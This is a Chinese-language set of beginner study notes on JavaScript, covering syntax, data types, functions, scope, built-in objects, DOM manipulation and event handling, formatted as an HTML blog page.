<h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><p>![](C:\Users\xiaoxiao\Pictures\Saved Pictures\2.jpg)</p>
<p>- </p>
<h3 id="模式化开发"><a href="#模式化开发" class="headerlink" title="模式化开发"></a>模式化开发</h3><p>![](C:\Users\xiaoxiao\Pictures\Saved Pictures\3.jpg)</p>
<p>![](C:\Users\xiaoxiao\Pictures\Saved Pictures\4.jpg)</p>
<p>![](C:\Users\xiaoxiao\Pictures\Saved Pictures\模块.jpg)</p>
<h2 id="JaveScript"><a href="#JaveScript" class="headerlink" title="JaveScript"></a>JaveScript</h2><h3 id="基本认识"><a href="#基本认识" class="headerlink" title="基本认识"></a>基本认识</h3><ul>
<li><p>三部分组成： ECMAScript  (JavaScript 语法) 、DOM(页面文档对象模型)、BOM（浏览器对象模型）</p>
</li>
<li><p>书写位置：</p>
<ul>
<li><p>行内式 JS :<code>&lt;input type=&quot;button&quot; onclick=&quot;alert(&#39;Hello World&#39;)&quot;/&gt;</code></p>
<ul>
<li>可以将单行或少量JS代码写在HTML标签事件属性中（以on开头的属性）：eg: onclick</li>
<li>在HTML我们推荐使用” “ , JS中我们推荐使用 ‘  ’ 。</li>
<li>可读性差，容易弄混</li>
</ul>
</li>
<li><p>内嵌JS</p>
<ul>
<li>将多行JS代码写到</li>
<li>script 标签中间不可以写代码</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>书写位置</p>
<h3 id="基本语法："><a href="#基本语法：" class="headerlink" title="基本语法："></a>基本语法：</h3><h4 id="输入输出语句："><a href="#输入输出语句：" class="headerlink" title="输入输出语句："></a>输入输出语句：</h4><p>- </p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>alert(msg)</td>
<td>浏览器弹出警示框</td>
</tr>
<tr>
<td>console .log(msg)</td>
<td>浏览器控制台打印输出信息</td>
</tr>
<tr>
<td>prompt(info)</td>
<td>浏览器弹出输入框，用户可以输入</td>
</tr>
</tbody></table>
<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><h5 id="变量的使用："><a href="#变量的使用：" class="headerlink" title="变量的使用："></a>变量的使用：</h5><ul>
<li>变量的初始化 ：<code>var age ; age=18 ; console.log(age)</code></li>
</ul>
<h5 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h5><ul>
<li>alert(Infinity) 无穷大</li>
<li>alert(-Infinity) 无穷小</li>
<li>alert（NaN）会判断是不是数字</li>
<li>字符串引号嵌套：外双内单，外单内双</li>
<li>转义符：\n  \t</li>
<li>如果一个变量声明未赋值，为undefined。undefined 和数字相加为NaN</li>
<li>null和数字相加为该数字</li>
</ul>
<h6 id="整个字符串"><a href="#整个字符串" class="headerlink" title="整个字符串"></a>整个字符串</h6><p>-<br>获取字符串长度   语法： <code>alert（str.length)</code></p>
<p>-<br>字符串的拼接：数值相加，字符相连</p>
<h6 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h6><ul>
<li>布尔型和数字型相加时，true为1，false为0</li>
</ul>
<h6 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h6><p>-<br>检测变量数据类型</p>
<p>-<br>prompt 取过来的是String型</p>
<p>-<br>字面量表示如何表示这个数（什么类型）</p>
<h5 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h5><p>-<br>  把数字型转换为字符串型</p>
<ul>
<li><p>变量.toString</p>
</li>
<li><p>String(变量)</p>
</li>
<li><p>利用+拼接字符串的方法实现转换效果</p>
</li>
<li><p>字符型转换成数字型</p>
<ul>
<li><p>parseInt(String)函数    (注意大小写)</p>
</li>
<li><p>parseFloat（String）函数</p>
</li>
<li><p>Number（变量） 强制类型转换符</p>
</li>
<li><p>利用了算数转换 -*+&#x2F;         &#x2F;&#x2F;隐式转换</p>
<ul>
<li>console.log (‘123’-‘120’);</li>
</ul>
</li>
</ul>
</li>
<li><p>转换为布尔型类型</p>
<ul>
<li>代表空，否定的元素都会被转换成false，如 ‘ ’，0，NaN , null ,undefined</li>
<li>其余值都会转换为true</li>
</ul>
</li>
<li><p>不要直接判断两个浮点数是否相等</p>
</li>
<li><p>&#x3D;&#x3D;是默认转换数据类型 会把字符串型的数据转换成数字型</p>
</li>
<li><p>&#x3D;&#x3D;&#x3D;全等符号，一模一样，要求两侧的值和数据类型完全相等</p>
</li>
<li><p>逻辑短路运算</p>
</li>
<li><p>语法： <code>表达式1 &amp;&amp; 表达式2</code></p>
</li>
<li><p>    如果表达式1结果为真  则返回表达式2</p>
</li>
<li><p>如果表达式1为假，那么返回表达式1</p>
</li>
<li><p>逻辑中断 （会影响程序的执行结果）</p>
<ul>
<li>语法： <code>表达式1 || 表达式2</code></li>
<li>如果第一个表达式的值为真，则返回表达式1 ，表达式2不再执行</li>
<li>如果表达式的值为假，则返回表达式2</li>
</ul>
</li>
</ul>
<h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><p>-<br>function 声明函数的关键字    全部小写</p>
<p>-<br>函数是做某件事情，函数名一般是动词</p>
<p>-<br>调函数的时候是函数名（），千万不要忘记加小括号</p>
<p>-<br>函数的参数可以有，也可以没有，个数不限</p>
<p>-<br>return 返回的是最后一个值</p>
<h5 id="arguments的使用"><a href="#arguments的使用" class="headerlink" title="arguments的使用"></a>arguments的使用</h5><ul>
<li>存储了所有传递过来的所有实参</li>
<li>arguments显示形式是一个伪数组，不是真正意义上的数组</li>
<li>具有数组的length属性</li>
<li>按照索引的方式进行存储</li>
<li>没有真正数组的一些方法pop() push() 等等</li>
<li>按照数组的方式可以遍历argument</li>
<li>只有函数才有argument，而且每个函数都内置好了这个argument</li>
</ul>
<h5 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h5><h6 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h6><ul>
<li>任何位置都可以使用</li>
<li>在全局作用域下var声明的变量</li>
<li>特殊情况下，在函数内不使用var声明的变量</li>
</ul>
<h6 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h6><ul>
<li>局部变量只能在该函数内部使用</li>
<li>在函数内部var声明的变量</li>
<li>函数的形参实际上就是局部变量</li>
</ul>
<h6 id="注意点-1"><a href="#注意点-1" class="headerlink" title="注意点"></a>注意点</h6><ul>
<li>JS 没有块级作用域   在 es6 的时候新增作用域</li>
<li>全局变量任何时候都可以使用，只有在浏览器关闭时才会被销毁，比较占内存</li>
<li>局部变量只在函数内部使用，当代码块结束后就会被销毁</li>
<li>内部函数访问外部函数的变量时，采取的是链式查找 ，就近原则</li>
</ul>
<h5 id="预解析"><a href="#预解析" class="headerlink" title="预解析"></a>预解析</h5><p>-<br>预解析 JS 引擎会把js里面的所有的var还有function 提升到当前作用域的最前面   再执行代码，按照代码的书写顺序从上往下执行</p>
<p>-<br>变量提升：就是把所有的变量声明提升到当前的作用域最前面  不提升赋值操作</p>
<p>-<br>函数提升：就是把所有的函数声明提升到当前作用域的最前面 不调用函数</p>
<p>-<br>var a&#x3D;b&#x3D;c&#x3D;9     相当于  var a&#x3D;9;b&#x3D;9;c&#x3D;9; b 和 c 直接赋值  没有var 声明  当全局变量来看</p>
<p>-<br>集体声明： var a&#x3D;9,b&#x3D;9,c&#x3D;9;</p>
<h4 id="自定义对象"><a href="#自定义对象" class="headerlink" title="自定义对象"></a>自定义对象</h4><ul>
<li>对象是有属性和方法组成的</li>
</ul>
<h5 id="字面量创建对象"><a href="#字面量创建对象" class="headerlink" title="字面量创建对象"></a>字面量创建对象</h5><ul>
<li><p>对象字面量：就是{}里面包含了表达这个具体事物（对象）的属性和方法</p>
</li>
<li><p>{}采用键值对的形式表示</p>
<ul>
<li>键：相当于属性名</li>
<li>值：相当于属性值，可以是任意类型的值（数字类型、字符串类型、布尔类型、函数类型）</li>
</ul>
</li>
</ul>
<h6 id="属性属性和函数方法的区别"><a href="#属性属性和函数方法的区别" class="headerlink" title="属性属性和函数方法的区别"></a>属性属性和函数方法的区别</h6><ul>
<li><p>变量和属性相同点：都是用来存储数据的</p>
</li>
<li><p>不同点：</p>
<ul>
<li>变量单独声明并赋值  使用时直接写变量名，单独存在</li>
<li>属性 在对象里面是不需要声明的，使用的时候必须时对象.属性</li>
</ul>
</li>
<li><p>函数和方法的相同点： 都是实现某种功能  做某件事</p>
</li>
<li><p>不同点</p>
<ul>
<li>函数是单独声明  并且调用的  函数名（） ，单独存在的</li>
<li>方法：在对象里面 调用的时候  对象.方法</li>
</ul>
</li>
</ul>
<h5 id="利用-new-Object-创建对象"><a href="#利用-new-Object-创建对象" class="headerlink" title="利用 new Object 创建对象"></a>利用 new Object 创建对象</h5><p>-<br>语法： <code>var obj=new Object();</code></p>
<p>-<br>利用等号 &#x3D;赋值的方法，添加对象的属性和方法</p>
<p>-<br>new 构造函数可以在内存中创建一个空的对象</p>
<p>-<br>this 就会指向刚才创建的空对象</p>
<p>-<br>执行构造函数里面的代码， 给这个空对象添加属性和方法</p>
<h5 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h5><ul>
<li>定义：就是把我们对象里面的一些相同属性和方法抽象出来封装到函数里面</li>
<li>语法格式：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function  构造函数名（）&#123;</span><br><span class="line">		this.属性=值；</span><br><span class="line">		this.方法=function（）&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>注意：</p>
<ul>
<li>构造函数名字首字母要大写</li>
<li>我们构造函数不需要return 就可以返回结果</li>
<li>我们调用构造函数  必须使用new</li>
<li>我们只要 new Star() 调用函数就创建一个对象</li>
<li>我们的属性和方法前面必须添加 this</li>
</ul>
</li>
<li><p>构造函数  泛指的一大类，它类似于 Java语言里面的类（class）</p>
</li>
<li><p>对象：特指   就是一个具体的事物</p>
</li>
<li><p>我们利用构造函数创建对象的过程也称为对象的实例化</p>
</li>
</ul>
<h5 id="遍历对象"><a href="#遍历对象" class="headerlink" title="遍历对象"></a>遍历对象</h5><ul>
<li>语法：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (var k in obj)&#123;</span><br><span class="line">	console.log(k);//k 变量 输出   得到的是：属性名</span><br><span class="line">	console.log(obj[k])  得到的是属性值</span><br><span class="line">&#125;   /*用k 或者key*/</span><br></pre></td></tr></table></figure>

<h4 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h4><h5 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h5><ul>
<li>JS语言自带的一些对象，提供了一些常用的或者是最基础而必要的功能</li>
</ul>
<h5 id="查文档"><a href="#查文档" class="headerlink" title="查文档"></a>查文档</h5><ul>
<li><p>MDN</p>
</li>
<li><p>方法：</p>
<ul>
<li>查阅该方法的功能</li>
<li>查看里面参数的意义和类型</li>
<li>查看返回值的意义和类型</li>
<li>通过demo进行测试</li>
</ul>
</li>
</ul>
<h5 id="Math对象"><a href="#Math对象" class="headerlink" title="Math对象"></a>Math对象</h5><p>-<br>不是一个构造函数，直接使用属性和方法</p>
<p>-<br>绝对值方法</p>
<p>-<br>  三个取整方法</p>
<ul>
<li><p>Math.floor() 地板  向下取整   往最小了取整</p>
</li>
<li><p>Math.ceil   向上取整，往大了取整</p>
</li>
<li><p>Math.round()   四舍五入，，但是5特殊，往大了取，意味着 -1.5会结果是-1</p>
</li>
<li><p>随机数random</p>
<ul>
<li><p>返回一个随机小数[0.0,1.0)</p>
</li>
<li><p>这个方法里面不跟参数</p>
</li>
<li><p>得到两个数之间的随机整数（包含这两个整数）</p>
<ul>
<li>Math.Floor(Math.random()*(max-min+1)+min);</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="日期对象"><a href="#日期对象" class="headerlink" title="日期对象"></a>日期对象</h5><ul>
<li>获取当前时间必须实例化</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var now=new Date()；</span><br><span class="line">console.log(now);</span><br></pre></td></tr></table></figure>

<p>-<br>  Date()构造函数的参数</p>
<ul>
<li><p>如果括号里面有时间，就返回参数里面的时间。例如日期格式字符串为‘2019-5-1’，可以写成new Date(‘2019&#x2F;5&#x2F;1’)</p>
</li>
<li><p>记得月份+1，周一返回的是1，周六返回的是6，但是周日返回的是0</p>
</li>
<li><p>获取Date总的毫秒数  不是当前时间的毫秒数   而是距离1970.1.1总的毫秒数</p>
<ul>
<li></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var date = new Date();</span><br><span class="line">        console.log(date.valueOf());</span><br><span class="line">        console.log(date.getTime());</span><br><span class="line">         // 简单的写法(最常用的写法)</span><br><span class="line">        var date1 = +new Date();</span><br><span class="line">        console.log(date1);</span><br><span class="line">        // 最新的获取总的毫秒数</span><br><span class="line">        console.log(Date.now());</span><br></pre></td></tr></table></figure>



<h5 id="数组对象"><a href="#数组对象" class="headerlink" title="数组对象"></a>数组对象</h5><ul>
<li><p>Array    方法</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td>push(参数1…)</td>
<td>末尾添加一个或者多个元素，注意修改原数组</td>
<td>并返回新的长度</td>
</tr>
<tr>
<td>pop()</td>
<td>删除数组最后一个元素，把数组长度减1无实参、修改原数组</td>
<td>返回它删除的元素的值</td>
</tr>
<tr>
<td>unshift(参数1…)</td>
<td>向数组的开头添加一个或更多元素，注意修改原数组</td>
<td>并返回新的长度</td>
</tr>
<tr>
<td>shift()</td>
<td>删除数组的第一个元素，数组长度减1无参数，修改原数组</td>
<td>并返回第一个元素的值</td>
</tr>
</tbody></table>
</li>
<li><p>获取数组元素indexOf（）</p>
</li>
<li><p>数组去重元素</p>
</li>
<li><p>数组转换成字符串 toString</p>
</li>
<li><p>分隔符 join ,让元素之间用什么隔开</p>
</li>
<li><p>连接两个或者多个数组，不影响原数组   concat()</p>
</li>
<li><p>数组截取   slice</p>
</li>
<li><p>数组删除splice（第几个数开始，要删除几个数）</p>
</li>
</ul>
<h5 id="字符串对象"><a href="#字符串对象" class="headerlink" title="字符串对象"></a>字符串对象</h5><ul>
<li><p>基本包装类型：把简单数据类型包装成为了复杂数据类型，这样基本数据类型就有了属性和方法</p>
</li>
<li><p>字符串的不可变：</p>
<ul>
<li>指里面的值不可变，虽然看上去可以改变内容，但其实是地址变了，内存中新开辟了一个内存空间</li>
</ul>
</li>
<li><p>根据字符返回位置</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>indexOf(‘要查找的字符’,[起始位置])</td>
<td>返回指定内容在原字符串中位置，如果找不到就返回-1，开始的位置是index 索引号</td>
</tr>
<tr>
<td>lastIndexOf()</td>
<td>从后往前找，只能找第一个与之匹配的</td>
</tr>
</tbody></table>
</li>
<li><p>根据位置返回字符（重点）</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
<th>使用</th>
</tr>
</thead>
<tbody><tr>
<td>charAt (index)</td>
<td>返回指定位置的字符（index 字符串的索引号）</td>
<td>str.charAt(0)</td>
</tr>
<tr>
<td>charCodeAt(index)</td>
<td>获取指定位置上字符ASCII码值（index索引值）</td>
<td>str.charCodeAt(0)</td>
</tr>
<tr>
<td>str[index]</td>
<td>获取指定位置处的字符</td>
<td>H5</td>
</tr>
</tbody></table>
</li>
<li><p>字符串的操作方法</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>concat(str1,str2,str3,…)</td>
<td>concat()方法用于连接两个或者多个字符串，拼接字符串，等效于+，+常用</td>
</tr>
<tr>
<td>substr(start,length)</td>
<td>从start 位置开始（索引号），length取得个数  重点</td>
</tr>
<tr>
<td>slice（start，end)</td>
<td>从start位置开始，截取到end位置，end取不到（两个都是索引号）</td>
</tr>
<tr>
<td>substring(start,end)</td>
<td>从start位置开始，截取到end位置，end取不到，基本和slice 相同 但是不接受负值</td>
</tr>
<tr>
<td>replace（’str1’,’str2’…)</td>
<td>str1 被替换的字符，str2替换为的字符  ，只会替换第一个字符</td>
</tr>
<tr>
<td>split（’str’）</td>
<td>str 将字符转换为数组，，前面学过join将数组转换为字符串</td>
</tr>
</tbody></table>
</li>
</ul>
<h4 id="简单类型和复杂类型"><a href="#简单类型和复杂类型" class="headerlink" title="简单类型和复杂类型"></a>简单类型和复杂类型</h4><h5 id="简单类型"><a href="#简单类型" class="headerlink" title="简单类型"></a>简单类型</h5><p>-<br>定义：基本数据类型或者值类型</p>
<p>-<br>值类型：简单数据类型&#x2F;基本数据类型，在存储时变量存储的是值本身</p>
<h5 id="复杂类型"><a href="#复杂类型" class="headerlink" title="复杂类型"></a>复杂类型</h5><ul>
<li>引用类型：在存储时变量中存储的时地址，通过new关键字创建的数组（系统数组，自定义数组）</li>
</ul>
<h3 id="Web-APIs"><a href="#Web-APIs" class="headerlink" title="Web APIs"></a>Web APIs</h3><p>-<br>API   应用程序接口，一种给程序员提供的工具（接口），更轻松的实现想要完成的功能</p>
<p>-<br>Web API 一套浏览器功能和页面元素的API（BOM和DOM）</p>
<h4 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h4><ul>
<li>作用：可以改变网页的内容、结构和样式</li>
</ul>
<h5 id="DOM树"><a href="#DOM树" class="headerlink" title="DOM树"></a>DOM树</h5><ul>
<li>文档：一个页面就是一个文档，，用document表示</li>
<li>元素：页面中的所有标签都是元素，DOM中用element来表示</li>
<li>节点：网页中所有的内容都是结点（标签、属性、文本、注释等），DOM中使用node表示，DOM把以上的内容都看作是节点</li>
</ul>
<h5 id="获取元素"><a href="#获取元素" class="headerlink" title="获取元素"></a>获取元素</h5><h6 id="根据ID获取"><a href="#根据ID获取" class="headerlink" title="根据ID获取"></a>根据ID获取</h6><ul>
<li>语法： <code>document.getElementById(id);</code></li>
<li>注意：因为我们文档页面从上往下加载，所以先得有标签 所以我们script 写到下面</li>
<li>参数id是大小写敏感的字符串</li>
<li>返回的是一个元素对象</li>
<li>console.dir  打印我们返回的元素对象 更好的查看里面的属性和方法</li>
</ul>
<h6 id="根据标签名获取"><a href="#根据标签名获取" class="headerlink" title="根据标签名获取"></a>根据标签名获取</h6><ul>
<li><p>语法： <code>document.getElementsByTagName(&#39;标签名&#39;)</code></p>
</li>
<li><p>得到的是一个对象的集合，所以我们想要操作里面的元素就需要遍历</p>
</li>
<li><p>得到的元素对象是动态的</p>
</li>
<li><p>返回的是伪数组的形式，不管页面中有没有这个元素</p>
</li>
<li><p>根据某个父元素内部所有指定标签名的子元素</p>
<ul>
<li><code>element.getElementsByTagName(&#39;标签名&#39;);</code></li>
<li>注意：父元素必须是单个对象（必须指明是哪一个元素）获取的时候不包括父元素自己</li>
</ul>
</li>
<li><p>根据类名获得某些元素集合</p>
<ul>
<li><p><code>document . getElementsByClassName(&#39;类名&#39;)；</code></p>
</li>
<li><p>根据指定选择器返回第一个元素：</p>
<ul>
<li><code>document . queryselector(&#39;选择器&#39;)；</code></li>
<li>切记：里面的选择器需要加符号  类名.box     #nav</li>
</ul>
</li>
<li><p>返回指定元素的所有所有元素对象</p>
<ul>
<li>语法：  <code>document.querySelectorAll(&#39;选择器&#39;)；</code></li>
</ul>
</li>
<li><p>获取body元素</p>
<ul>
<li>语法：  <code>document.body</code></li>
</ul>
</li>
<li><p>获取HTML元素</p>
<ul>
<li>语法：  <code>document.documentElement</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="事件基础"><a href="#事件基础" class="headerlink" title="事件基础"></a>事件基础</h5><ul>
<li>获取事件源</li>
<li>注册事件（绑定事件）</li>
<li>添加事件处理程序（采用函数赋值形式）</li>
</ul>
<h5 id="操作元素"><a href="#操作元素" class="headerlink" title="操作元素"></a>操作元素</h5><h6 id="改变元素内容"><a href="#改变元素内容" class="headerlink" title="改变元素内容"></a>改变元素内容</h6><p>-<br>两者的区别：</p>
<p>   -<br>element . innerText 从起始位置到终止位置的内容，但他去除HTML标签，同时空格和换行也会去掉</p>
<p>   -<br>element.innerHTML: 起始位置到终点位置的全部内容，包括HTML标签，同时保留空格和换行</p>
<h6 id="修改表单元素"><a href="#修改表单元素" class="headerlink" title="修改表单元素"></a>修改表单元素</h6><p>-<br>获取元素</p>
<p>-<br>  注册事件    处理程序</p>
<ul>
<li><p>input.innerHTML&#x3D; ‘点击了’ ；这个是普通盒子比如div标签里面的内容</p>
</li>
<li><p>表单里面的值文字内容是通过value来修改的</p>
</li>
<li><p>如果想要某个表单被禁用，不能再点击   用disabled，将这个button禁用</p>
<ul>
<li>this.disabled&#x3D;true    &#x2F;&#x2F;this	指向的是时间函数的调用者</li>
</ul>
</li>
</ul>
<h6 id="修改元素属性"><a href="#修改元素属性" class="headerlink" title="修改元素属性"></a>修改元素属性</h6><p>-<br>  修改元素的大小，颜色，位置等样式</p>
<ul>
<li><p>element.style  行内样式操作</p>
</li>
<li><p>element.className 类名样式操作</p>
</li>
<li><p>注意点：</p>
<ul>
<li>Js里面的样式采取驼峰命名法</li>
<li>Js修改style样式操作，产生的还是行内样式，CSS权重比较高</li>
</ul>
</li>
<li><p>如果样式比较少，或者功能简单的情况下使用element.style</p>
</li>
<li><p>如果样式修改较多，可以采取操作类名方式更改元素样式</p>
</li>
<li><p>class因为是个保留字，因此使用className来操作元素类别属性</p>
</li>
<li><p>className 会直接更改元素的类名，会覆盖原先的类名  如果要保留原先的类名用多类名选择器</p>
</li>
</ul>
<h6 id="循环精灵图"><a href="#循环精灵图" class="headerlink" title="循环精灵图"></a>循环精灵图</h6><h6 id="显示隐藏文本框内容"><a href="#显示隐藏文本框内容" class="headerlink" title="显示隐藏文本框内容"></a>显示隐藏文本框内容</h6><ul>
<li>表单需要两个新事件，获得焦点onfocus和失去焦点onblur</li>
<li>如果获得焦点，判断表单里面的内容是否为默认内容，如果是默认内容，就清空表单内容</li>
<li>如果失去焦点，判断表单内容是否为空，如果为空，则表单内容改为默认文字</li>
</ul>
<h6 id="操作元素总结"><a href="#操作元素总结" class="headerlink" title="操作元素总结"></a>操作元素总结</h6><ul>
<li><p>操作元素内容：</p>
<ul>
<li>innerText</li>
<li>innerHTML</li>
</ul>
</li>
<li><p>操作常见元素属性：</p>
<ul>
<li>src  , href  , title,alt 等</li>
</ul>
</li>
<li><p>操作表单元素属性：</p>
<ul>
<li>type ， value , disabled等</li>
</ul>
</li>
<li><p>操作元素样式属性：</p>
<ul>
<li>element.style</li>
<li>className</li>
</ul>
</li>
</ul>
<h6 id="排他思想"><a href="#排他思想" class="headerlink" title="排他思想"></a>排他思想</h6><ul>
<li>所有的元素全部消灭样式</li>
<li>给当前元素设置样式</li>
<li>注意顺序不能颠倒，首先干掉其他人，再设置自己</li>
</ul>
<h6 id="获取自定义属性"><a href="#获取自定义属性" class="headerlink" title="获取自定义属性"></a>获取自定义属性</h6><p>-<br>element.属性</p>
<p>-<br>element.getAttribute(‘属性’);</p>
<p>-<br>  区别：</p>
<ul>
<li><p>前者是获取内置属性值（元素本身自带的属性）</p>
</li>
<li><p>获得自定义属性，自己定义的属性</p>
</li>
<li><p>设置属性值：</p>
<ul>
<li>element.属性&#x3D;‘值’（设置内置属性）</li>
<li>element.setAttribute(‘属性’，‘值’)；主要针对于自定义属性</li>
</ul>
</li>
<li><p>目的：保存并使用数据，有些数据可以保存到页面而不用保存到数据库中</p>
</li>
<li><p>H5规定自定义属性data开头做为属性名并且赋值</p>
<ul>
<li>例如</li>
</ul>
</li>
</ul>
<h5 id="节点操作"><a href="#节点操作" class="headerlink" title="节点操作"></a>节点操作</h5><p>-<br>利用父子兄节点关系来获取元素，逻辑性较强</p>
<p>-<br>网页中所有内容都是节点（标签、属性、文本、注释等）</p>
<h6 id="节点概述"><a href="#节点概述" class="headerlink" title="节点概述"></a>节点概述</h6><ul>
<li><p>基本属性：</p>
<ul>
<li><p>节点类型(nodeType)</p>
<ul>
<li>元素节点的nodeType 为1</li>
<li>属性节点的nodeType为2</li>
<li>文本节点的nodeType为3 (文本节点包含文字‘空格、换行等)</li>
</ul>
</li>
<li><p>节点名称(nodeName)</p>
</li>
<li><p>节点值(nodeValue)</p>
</li>
</ul>
</li>
</ul>
<h6 id="节点层级"><a href="#节点层级" class="headerlink" title="节点层级"></a>节点层级</h6><p>-<br>  父级节点</p>
<ul>
<li><p><code>node.parentNode</code>	得到的是离元素最近的父级节点</p>
</li>
<li><p>如果没有就会返回null</p>
</li>
<li><p>子节点</p>
<ul>
<li></li>
</ul>
</li>
</ul>
<p><code>parentsNode.childNode(标准)</code></p>
<p>   -<br>返回值里面包含了所有的子节点，包括元素节点，文本节点等</p>
<p>   -<br>如果只想要获取里面的元素节点</p>
<p>   -<br>   <code>parentNode.children(非标准)</code></p>
<pre><code>  - 返回所有的子元素节点，只返回子元素节点，其余节点不返回
</code></pre>
<p>   -<br>   返回第一个子元素节点：</p>
<pre><code>  - `parentNode.firstElementChild`
</code></pre>
<p>   -<br>   返回第二个子元素节点</p>
<pre><code>  - `parentNode.lastElementChild`
</code></pre>
<p>   -<br>如果想要第i个子元素节点，也可以用<code>parentNode.chilren[i]</code></p>
<p>-<br>  兄弟节点：</p>
<ul>
<li><p><code>node.nextSibling</code></p>
<ul>
<li>返回当前元素的下一个兄弟节点，找不到就返回null，同样，包含所有的节点</li>
</ul>
</li>
<li><p>node.previousElementSibling</p>
<ul>
<li>返回当前元素上一个兄弟节点，找不到返回null</li>
</ul>
</li>
</ul>
<h6 id="创建节点"><a href="#创建节点" class="headerlink" title="创建节点"></a>创建节点</h6><ul>
<li><p><code>document.createElement(&#39;tagName&#39;)</code></p>
</li>
<li><p><code>document.write</code></p>
<ul>
<li>直接将内容写入页面的内容流，但是文档流执行完毕，则他就会导致页面全部重绘</li>
</ul>
</li>
<li><p>innerHTML 是将内容写入某个DOM节点，不会导致页面全部重绘</p>
</li>
<li><p>innerHTML创建多个元素效率更高（注意不要拼接字符串，采用数组形式拼接），结构稍微复杂些</p>
</li>
<li><p>createElementn 创建多个元素效率稍低一点，但是结构更清晰</p>
</li>
</ul>
<h6 id="添加节点"><a href="#添加节点" class="headerlink" title="添加节点"></a>添加节点</h6><ul>
<li><code>node.appendChild(child)</code> 方法将一个节点添加到指定父节点的子节点的子节点列表末尾 , 类似于CSS里面的after伪元素，后面追加元素</li>
<li><code>node.insertBefore(child,指定元素)</code></li>
</ul>
<h6 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h6><ul>
<li><code>node.removeChild(child)</code></li>
<li>阻止链接跳转需要之家加  javascript : void(0);  javascript:;</li>
</ul>
<h6 id="复制节点"><a href="#复制节点" class="headerlink" title="复制节点"></a>复制节点</h6><p>-<br><code>node.cloneNode()</code></p>
<p>-<br>  返回调用该方法的节点的一个副本，也称为克隆节点&#x2F;拷贝节点</p>
<ul>
<li>如果括号参数为空或者为false,则是浅拷贝，即只克隆复制节点本身，不克隆里面的子节点</li>
<li>如果括号参数为true ，则是深度拷贝，会复制节点本身以及里面所有的子节点</li>
</ul>
<h4 id="事件高级"><a href="#事件高级" class="headerlink" title="事件高级"></a>事件高级</h4><h5 id="注册事件"><a href="#注册事件" class="headerlink" title="注册事件"></a>注册事件</h5><h6 id="事件监听方式"><a href="#事件监听方式" class="headerlink" title="事件监听方式"></a>事件监听方式</h6><ul>
<li><p>语法：<code>eventTarget.addEventListener(type,listener[,useCapture])</code></p>
<ul>
<li>type:事件类型字符串，比如onclick , mouseover , 注意这里不要带on</li>
<li>listener:事件处理函数，事件发生时，会调用该监听函数</li>
<li>useCapture : 可选参数，是一个布尔值，默认时false</li>
</ul>
</li>
<li><p>了解 （没用）：<code>eventTarget.attachEvent(eventNameWithOn,callback)</code></p>
<ul>
<li>eventNameWithOn 事件类型字符串，比如“onclick , onmouseover” 这里要带on</li>
<li>callback:事件处理函数，当目标促发事件时回调函数被调用</li>
</ul>
</li>
</ul>
<h6 id="删除事件（解绑事件）"><a href="#删除事件（解绑事件）" class="headerlink" title="删除事件（解绑事件）"></a>删除事件（解绑事件）</h6><ul>
<li>语法：<code>eventTarget.removeEventList(type,listen[,useCapture])</code></li>
</ul>
<h5 id="DOM事件流"><a href="#DOM事件流" class="headerlink" title="DOM事件流"></a>DOM事件流</h5><ul>
<li><p>事件流描述的是从页面中接收事件的顺序</p>
</li>
<li><p>DOM事件流：事件发生时会在元素节点之间按照特定的顺序传播</p>
</li>
<li><p>三个阶段：</p>
<ul>
<li>捕获阶段</li>
<li>当前目标阶段</li>
<li>冒泡阶段</li>
</ul>
</li>
<li><p>注意：</p>
<ul>
<li>JS 代码中只能执行捕获或者冒泡其中的一个阶段</li>
<li><code>addEventListener(type,listener[,useCapture])</code>  第三个参数如果是true，表示在事件捕获阶段调用事件处理程序，如果是false(不写默认就是false)，表示在事件冒泡阶段调用事件处理程序</li>
<li>onclick 和 AttachEvent 只能得到冒泡阶段</li>
<li>实际开发中我们很少使用事件捕获，我们更关注事件冒泡</li>
<li>有些事件是没有冒泡的，比如：onblur , onfocus , onmousenter , ,onmouseleave</li>
</ul>
</li>
</ul>
<h5 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h5><p>-<br>理解：事件发生后，跟原事件相关的一系列信息数据的集合都放到这个对象里面，这个对象就是事件对象</p>
<p>-<br>语法：<code>eventTarget.onclick=function(event)</code></p>
<p>-<br>event是个形参，系统帮我们设定为事件对象，不需要传实参过去</p>
